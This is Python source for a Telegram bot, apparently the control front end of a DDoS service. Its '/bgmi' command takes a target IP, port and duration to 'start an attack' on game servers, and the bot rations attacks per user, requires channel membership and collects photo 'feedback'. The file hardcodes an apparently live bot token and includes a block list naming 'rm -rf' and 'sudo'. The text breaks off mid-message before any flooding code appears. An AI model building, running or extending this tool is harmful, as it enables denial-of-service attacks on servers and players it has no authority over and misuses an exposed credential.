import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton
import time
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

BLOCKED_COMMANDS = ["nano", "sudo", "rm", "rm -rf", "screen"]

TOKEN = '7956789514:AAGxj-xIj_wfkYMX-qniQOewRtyLKcMWXko'  # Replace with your actual bot token
ADMIN_IDS = [1549748318]  # Added new admin ID
CHANNEL_ID = '-1002654300042'  # Replace with your specific channel or group ID

bot = telebot.TeleBot(TOKEN)

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=10))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 0  # 0 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 15  # Daily attack limit per user

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [7460924747, 1662672529]


def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=10)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"

    # ✅ **Fetch user profile picture**
    has_photo = False
    try:
        photos = bot.get_user_profile_photos(user_id)
        if photos.total_count > 0:
            has_photo = True
            photo_file_id = photos.photos[0][0].file_id  # ✅ First photo ka File ID
    except Exception as e:
        print(f"Error fetching profile photo: {e}")  # ✅ Error handle karega

    # ✅ **Stylish Welcome Message**
    welcome_text = (
        f"👋🏻 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘, {user_name}!* 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 *𝗧𝗛𝗜𝗦 𝗜𝗦 RAJ 𝗕𝗢𝗧!*\n"
        f"🆔 **User ID:** `{user_id}`\n"
        "📢 *𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗖𝗵𝗮𝗻𝗻𝗲𝗹:*\n"
        "[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/RAJOWNER9090)\n\n"
        "📌 *𝗧𝗿𝘆 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:*\n"
        "`/bgmi` - 🚀 *Start an attack!*\n\n"
        "👑 *𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬:* [@RAJOWNER90](https://t.me/RAJOWNER90) 💀"
    )

    # ✅ **Inline Buttons**
    inline_keyboard = InlineKeyboardMarkup()
    inline_keyboard.add(
        InlineKeyboardButton("[➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖]", url="https://t.me/RAJOWNER9090")
    )
    inline_keyboard.add(
        InlineKeyboardButton("👑 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬 👑", url="https://t.me/RAJOWNER90")
    )


    # ✅ **Send message with or without profile photo**
    try:
        if has_photo:
            bot.send_photo(
                message.chat.id, photo_file_id,
                caption=welcome_text,
                parse_mode="Markdown",
                reply_markup=inline_keyboard
            )
        else:
            bot.send_message(
                message.chat.id, welcome_text,
                parse_mode="Markdown",
                disable_web_page_preview=True,
                reply_markup=inline_keyboard
            )

        # ✅ **Send Terminal Button after Welcome Message**
        bot.send_message(message.chat.id, "🔹 **Use the menu below:**", reply_markup=reply_keyboard, parse_mode="Markdown")

    except Exception as e:
        print(f"Error sending message: {e}")  # ✅ Error handling
        bot.send_message(
            message.chat.id, "❌ Error displaying welcome message.",
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = (
        "╔═════ ❰ 🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷  ❱ ═════╗\n\n"
        "🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        "┣➤ 〘 `/bgmi <target_ip> <port> <duration>` 〙– 🔥 **Start an Attack**\n\n"
        "📊 𝗦𝘁𝗮𝘁𝘂𝘀 & 𝗜𝗻𝗳𝗼:\n"
        "┣➤ 〘 `/status` 〙– 🕒 **Check Remaining Attacks & Cooldown**\n"
        "┣➤ 〘 `/reset_RAJ` 〙– ⚠️ *(Admin Only)* **Reset Attack Limits**\n\n"
        "🔗 𝗢𝘁𝗵𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:\n"
        "┣➤ 〘 `/start` 〙– 👋 **Bot Introduction & Welcome**\n"
        "┣➤ 〘 `/help` 〙– 📜 **Show This Help Menu**\n\n"
        "╚═════ ❰ ‼️🇩 🇦 🇷 🇰  🇽  🇸 🇪 🇷 🇻 🇪 🇷  ™ ‼️! ❱ ═════╝"
    )

    bot.reply_to(message, help_text, parse_mode="Markdown")


# PAPA RAJ
# 🛡️ 『 𝑺𝒕𝒂𝒕𝒖𝒔 𝑪𝒐𝒎𝒎𝒂𝒏𝒅 』🛡️

attack_end_time = None

@bot.message_handler(commands=['status'])
def status_command(message):
    global attack_end_time, attack_running
    
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "🚀 VIP User"

    remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
    remaining_ban_time = max(0, int((user_bans.get(user_id, datetime.min) - datetime.now()).total_seconds())) if user_id in user_bans else 0
    remaining_cooldown = max(0, int((user_cooldowns.get(user_id, datetime.min) - datetime.now()).total_seconds())) if user_id in user_cooldowns else 0
    attack_remaining_time = max(0, int((attack_end_time - datetime.now()).total_seconds())) if attack_running and attack_end_time else 0

    status_msg = bot.send_message(
        message.chat.id,
        "🔍 Checking status... ⏳"
    )

    while remaining_cooldown > 0 or remaining_ban_time > 0 or attack_remaining_time > 0:
        ban_minutes, ban_seconds = divmod(remaining_ban_time, 60)
        cooldown_minutes, cooldown_seconds = divmod(remaining_cooldown, 60)
        attack_minutes, attack_seconds = divmod(attack_remaining_time, 60)

        ban_status = f"🚫 BANNED: {ban_minutes} min {ban_seconds} sec ⛔" if remaining_ban_time > 0 else "✅ NOT BANNED 🟢"
        cooldown_status = f"🕒 COOLDOWN: {cooldown_minutes} min {cooldown_seconds} sec ⏳" if remaining_cooldown > 0 else "✅ NO COOLDOWN 🔥"
        attack_status = f"⚡ ATTACK REMAINING: {attack_minutes} min {attack_seconds} sec 🚀" if attack_remaining_time > 0 else "✅ NO ATTACK RUNNING 🛡️"

        status_text = (
            f"╔════════════════════════╗\n"
            f"      🎯 VIP USER STATUS 🎯\n"
            f"╚════════════════════════╝\n\n"
            f"👑 USER:  {user_name}\n"
            f"🆔 USER ID:  {user_id}\n\n"
            f"💥 REMAINING ATTACKS:  {remaining_attacks}/{DAILY_ATTACK_LIMIT} ⚡\n\n"
            f"{ban_status}\n"
            f"{cooldown_status}\n"
            f"{attack_status}\n\n"
            f"🔄 POWERED BY: 🇩 🇦 🇷 🇰  🇽  🇸 🇪 🇷 🇻 🇪 🇷  ™ 🚀"
        )

        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=status_text)
            time.sleep(3)  # ✅ **Now updates every 3 seconds instead of every second**
        except telebot.apihelper.ApiTelegramException as e:
            if "429" in str(e):
                retry_after = int(str(e).split("retry after ")[-1].split("\n")[0])  # Extract retry time
                bot.send_message(message.chat.id, f"⚠️ Too Many Requests! Retrying after {retry_after} sec... ⏳")
                time.sleep(retry_after)  # **Bot will wait and retry after given time**
                continue
            else:
                bot.send_message(message.chat.id, f"❌ ERROR: {e}")
                break

        remaining_ban_time = max(0, remaining_ban_time - 3)
        remaining_cooldown = max(0, remaining_cooldown - 3)
        attack_remaining_time = max(0, attack_remaining_time - 3)

    final_text = (
        f"╔════════════════════════╗\n"
        f"      🎯 FINAL STATUS 🎯\n"
        f"╚════════════════════════╝\n\n"
        f"👑 USER:  {user_name}\n"
        f"🆔 USER ID:  {user_id}\n\n"
        f"💥 REMAINING ATTACKS:  {remaining_attacks}/{DAILY_ATTACK_LIMIT} ⚡\n\n"
        f"✅ NO BAN 🟢\n"
        f"✅ NO COOLDOWN 🔥\n"
        f"✅ NO ATTACK RUNNING 🛡️\n\n"
        f"🔥 YOU ARE READY TO ATTACK! 🚀"
    )

    bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=final_text)


# 🔄 『 𝑹𝒆𝒔𝒆𝒕 𝑨𝒕𝒕𝒂𝒄𝒌 𝑳𝒊𝒎𝒊𝒕𝒔 』🔄

@bot.message_handler(commands=['reset_RAJ'])
def reset_attack_limits(message):
    user_id = message.from_user.id

    # 🛑 Only Admins Can Use This Command
    if user_id not in ADMIN_IDS:
        bot.reply_to(
            message, 
            "╔═══❰ 🚫 **𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!** 🚫 ❱═══╗\n\n"
            "💀 *𝐁𝐄𝐓𝐀, 𝐓𝐔 𝐀𝐃𝐌𝐈𝐍 𝐍𝐀𝐇𝐈 𝐇𝐀𝐈!* 💀\n"
            "🚷 **𝙋𝙚𝙧𝙢𝙞𝙨𝙨𝙞𝙤𝙣 𝘿𝙚𝙣𝙞𝙚𝙙 𝙛𝙤𝙧 𝙍𝙚𝙨𝙚𝙩!** 🚷\n\n"
            "⚠️ *𝗢𝗻𝗹𝘆 🇷 🇦 🇯  𝗟𝗼𝗿𝗱𝘀 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱!*",
            parse_mode="Markdown"
        )
        return

    # 🔄 Send Initial Loading Message
    loading_msg = bot.reply_to(
        message, 
        "🟢 **𝗜𝗡𝗜𝗧𝗜𝗔𝗟𝗜𝗭𝗜𝗡𝗚 𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧...** ⏳",
        parse_mode="Markdown"
    )

    # 🔄 Simulate Hacking Style Loading Effect
    loading_steps = [
        "🔹 **𝗘𝗿𝗮𝘀𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗼𝗴𝘀...** 🗑️",
        "🔹 **𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻𝘀...** ❌",
        "🔹 **𝗥𝗲𝘀𝗲𝘁𝘁𝗶𝗻𝗴 𝗦𝗬𝗦𝗧𝗘𝗠 𝗟𝗜𝗠𝗜𝗧𝗦...** ⚙️",
        "🔹 **𝗢𝗽𝘁𝗶𝗺𝗶𝘇𝗶𝗻𝗴 𝗧𝗙 𝗕𝗢𝗧...** 🔧",
        "🔹 **𝗦𝗬𝗦𝗧𝗘𝗠 𝗥𝗘𝗦𝗘𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!** ✅"
    ]

    for step in loading_steps:
        time.sleep(1)  # Wait for 1 second before updating message
        bot.edit_message_text(chat_id=message.chat.id, message_id=loading_msg.message_id, text=step, parse_mode="Markdown")

    # 🔄 Reset All Attack Data
    global user_attacks, user_cooldowns
    user_attacks.clear()
    user_cooldowns.clear()

    # ✅ Final Admin Confirmation Message
    bot.edit_message_text(
        chat_id=message.chat.id, 
        message_id=loading_msg.message_id, 
        text=(
            "╔══════ 🔥 **𝙍𝙀𝙎𝙀𝙏 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀!** 🔥 ══════╗\n\n"
            "⚡ *𝐀𝐥𝐥 𝐚𝐭𝐭𝐚𝐜𝐤 𝐥𝐢𝐦𝐢𝐭𝐬, 𝐜𝐨𝐨𝐥𝐝𝐨𝐰𝐧𝐬 & 𝐛𝐚𝐧𝐬 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐰𝐢𝐩𝐞𝐝!* ⚡\n\n"
            "🎯 **🇷 🇦 🇯  𝗦𝗬𝗦𝗧𝗘𝗠 𝗦𝗧𝗔𝗧𝗨𝗦:**\n"
            "✅ *𝐅𝐮𝐥𝐥 𝐏𝐨𝐰𝐞𝐫 𝐑𝐞𝐬𝐭𝐨𝐫𝐞𝐝! 𝐑𝐞𝐚𝐝𝐲 𝐭𝐨 𝐀𝐭𝐭𝐚𝐜𝐤!* 🚀\n\n"
            "💀 *𝙋𝙤𝙬𝙚𝙧 𝘽𝙚𝙡𝙤𝙣𝙜𝙨 𝙏𝙤 𝙏𝙝𝙚 𝙇𝙤𝙧𝙙𝙨!* 💀\n"
            "╚══════════════════════════╝"
        ),
        parse_mode="Markdown"
    )

# Handler for photos sent by users (feedback received)
# Define the feedback channel ID
FEEDBACK_CHANNEL_ID = "-1002095725114"  # Replace with your actual feedback channel ID

# Store the last feedback photo ID for each user to detect duplicates
last_feedback_photo = {}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    photo_id = message.photo[-1].file_id  # Get the latest photo ID

    # Check if the user has sent the same feedback before & give a warning
    if last_feedback_photo.get(user_id) == photo_id:
        response = (
            "⚠️🚨 *『 𝗪𝗔𝗥𝗡𝗜𝗡𝗚: SAME 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞! 』* 🚨⚠️\n\n"
            "🛑 *𝖸𝖮𝖴 𝖧𝖠𝖵𝖤 𝖲𝖤𝖭𝖳 𝖳𝖧𝖨𝖲 𝖥𝖤𝖤𝖣𝖡𝖠𝖢𝖪 𝘽𝙀𝙁𝙊𝙍𝙀!* 🛑\n"
            "📩 *𝙋𝙇𝙀𝘼𝙎𝙀 𝘼𝙑𝙊𝙄𝘿 𝙍𝙀𝙎𝙀𝙉𝘿𝙄𝙉𝙂 𝙏𝙃𝙀 𝙎𝘼𝙈𝙀 𝙋𝙃𝙊𝙏𝙊.*\n\n"
            "✅ *𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙒𝙄𝙇𝙇 𝙎𝙏𝙄𝙇𝙇 𝘽𝙀 𝙎𝙀𝙉𝙏!*"
        )
        response = bot.reply_to(message, response)

    # ✅ Store the new feedback ID (this ensures future warnings)
    last_feedback_photo[user_id] = photo_id
    user_photos[user_id] = True  # Mark feedback as given

    # ✅ Stylish Confirmation Message for User
    response = (
        "✨『 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑺𝑼𝑪𝑪𝑬𝑺𝑺𝑭𝑼𝑳𝑳𝒀 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』✨\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        "📩 𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!🎉\n"
        "━━━━━━━━━━━━━━━━━━━"
    )
    response = bot.reply_to(message, response)

    # 🔥 Forward the photo to all admins
    for admin_id in ADMIN_IDS:
        bot.forward_message(admin_id, message.chat.id, message.message_id)
        admin_response = (
            "🚀🔥 *『 𝑵𝑬𝑾 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲 𝑹𝑬𝑪𝑬𝑰𝑽𝑬𝑫! 』* 🔥🚀\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🛡️\n"
            f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
            "📸 *𝙏𝙃𝘼𝙉𝙆 𝙔𝙊𝙐 𝙁𝙊𝙍 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!!* ⬇️\n"
            "━━━━━━━━━━━━━━━━━━━"
        )
        bot.send_message(admin_id, admin_response)

    # 🎯 Forward the photo to the feedback channel
    bot.forward_message(FEEDBACK_CHANNEL_ID, message.chat.id, message.message_id)
    channel_response = (
        "🌟🎖️ *『 𝑵𝑬𝑾 𝑷𝑼𝑩𝑳𝑰𝑪 𝑭𝑬𝑬𝑫𝑩𝑨𝑪𝑲! 』* 🎖️🌟\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *𝙁𝙍𝙊𝙈 𝙐𝙎𝙀𝙍:* @{username} 🏆\n"
        f"🆔 *𝙐𝙨𝙚𝙧 𝙄𝘿:* `{user_id}`\n"
        "📸 *𝙐𝙎𝙀𝙍 𝙃𝘼𝙎 𝙎𝙃𝘼𝙍𝙀𝘿 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆.!* 🖼️\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "📢 *𝙆𝙀𝙀𝙋 𝙎𝙐𝙋𝙋𝙊𝙍𝙏𝙄𝙉𝙂 & 𝙎𝙃𝘼𝙍𝙄𝙉𝙂 𝙔𝙊𝙐𝙍 𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆!* 💖"
    )
    bot.send_message(FEEDBACK_CHANNEL_ID, channel_response)


# Track if an attack is currently running
attack_running = False  # ✅ Ek time pe sirf ek attack allow karega

# Define the maximum allowed duration for an attack (in seconds)
MAX_ATTACK_DURATION = 150  # Example: 5 minutes (300 seconds)


# Global variables for attack management
attack_running = False  # Indicates if an attack is currently running
attack_start_time = None  # Tracks when the attack started
MAX_ATTACK_DURATION = 150  # Maximum attack duration in seconds

# Helper functions for validation
def is_valid_ip(ip):
    """Check if the IP address is valid."""
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

def is_valid_port(port):
    """Check if the port number is valid."""
    return port.isdigit() and 0 <= int(port) <= 65535

def is_valid_duration(duration):
    """Check if the duration is valid."""
    return duration.isdigit() and 0 < int(duration) <= MAX_ATTACK_DURATION

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global attack_running, attack_start_time

    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    # Check if an attack is already running
    if attack_running:
        bot.reply_to(
            message,
            "🚨 **𝗔𝗧𝗧𝗔𝗖𝗞 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗥𝗨𝗡𝗡𝗜𝗡𝗚!** 🚨\n\n"
            "⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝘂𝗻𝘁𝗶𝗹 𝘁𝗵𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱."
        )
        return

    # Check if the user is in the required channel
    try:
        user_status = bot.get_chat_member(FEEDBACK_CHANNEL_ID, user_id).status
        if user_status not in ["member", "administrator", "creator"]:
            # Inline button for joining the channel
            keyboard = InlineKeyboardMarkup()
            join_button = InlineKeyboardButton("➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖", url="https://t.me/RAJOWNER9090")
            keyboard.add(join_button)

            # Try to fetch user profile photo
            try:
                photos = bot.get_user_profile_photos(user_id)
                if photos.total_count > 0:
                    photo_file_id = photos.photos[0][0].file_id  # User's latest profile photo
                    bot.send_photo(
                        message.chat.id,
                        photo_file_id,
                        caption=(
                            f"👤 **User:** `{message.from_user.first_name}`\n\n"
                            " *‼️🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷 ™ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗‼️* \n\n"
                            "📢 *LET'S GO AND JOIN CHANNEL*\n\n"
                            f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/RAJOWNER9090)\n\n"
                            " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*"
                        ),
                        parse_mode="Markdown",
                        reply_markup=keyboard
                    )
                else:
                    raise Exception("User has no profile photo.")
            except Exception as e:
                # If profile photo cannot be fetched, send a normal message
                bot.send_message(
                    message.chat.id,
                    f"⚠️ **DP Error:** {e}\n\n"
                    " *‼️🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷 ™ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗‼️* \n\n"
                    "📢 *LET'S GO AND JOIN CHANNEL*\n\n"
                    f" [➖ 𝗖𝗟𝗜𝗖𝗞 𝗛𝗘𝗥𝗘 𝗧𝗢 𝗝𝗢𝗜𝗡 ➖](https://t.me/RAJOWNER9090)\n\n"
                    " *‼️𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻𝗶𝗻𝗴, 𝘁𝗿𝘆 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 /bgmi 𝗮𝗴𝗮𝗶𝗻‼️*",
                    parse_mode="Markdown",
                    disable_web_page_preview=True,
                    reply_markup=keyboard
                )
            return
    except Exception as e:
        bot.send_message(
            message.chat.id,
            f"⚠️ *Error checking channel membership: {e}*"
        )
        return

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(
            message.chat.id,
            "⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️\n\n"
            "[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @RAJOWNER90 ( TUMHARE_PAPA ) | ]"
        )
        return

    # Parse the command arguments
    try:
        args = message.text.split()[1:]  # Skip the command itself
        if len(args) != 3:
            raise ValueError(
                "🇩 🇦 🇷 🇰 🇽 🇸 🇪 🇷 🇻 🇪 🇷 ™ 𝗣𝗨𝗕𝗟𝗶𝗖 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ "

                "⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙛𝙤𝙧𝙢𝙖𝙩 "
                " /bgmi <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>"
            )

        target_ip, target_port, duration = args

        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("❌ **𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗜𝗣 𝗮𝗱𝗱𝗿𝗲𝘀𝘀.**")
        if not is_valid_port(target_port):
            raise ValueError("❌ **𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗻𝘂𝗺𝗯𝗲𝗿.**")
        if not is_valid_duration(duration):
            raise ValueError("❌ **𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻.**")

        # Ensure duration does not exceed 150 seconds
        duration = int(duration)
        if duration > MAX_ATTACK_DURATION:
            raise ValueError(f"⚠️ **𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗹𝗶𝗺𝗶𝘁 𝗶𝘀 𝟭𝟱𝟬 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.**")

        # Start the attack
        attack_running = True
        attack_start_time = datetime.now()

        # Send attack confirmation message
        bot.reply_to(
            message,
            f"🚀 **𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!** 🚀\n\n"
            f"🎯 **𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗣:** `{target_ip}`\n"
            f"🔌 **𝗣𝗼𝗿�
